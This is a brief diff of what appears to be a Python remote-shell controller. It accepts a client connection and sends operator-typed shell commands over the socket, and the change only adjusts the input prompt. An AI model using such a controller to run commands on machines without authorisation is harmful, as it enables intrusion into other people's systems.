@@ -15,7 +15,7 @@ print("[*] Connected by", addr) # Print connected by ipaddress
 data = conn.recv(1024).decode("UTF-8") # Receive initial connection
 
 while 1: # Start loop
-    command = input("Enter shell command or quit: ") # Enter shell command
+    command = input("Enter shell command or quit> ") # Enter shell command
     conn.send(bytes(command, "UTF-8")) # Send shell command
     if command == "quit":
         break # If we specify quit then break out of loop and close socket
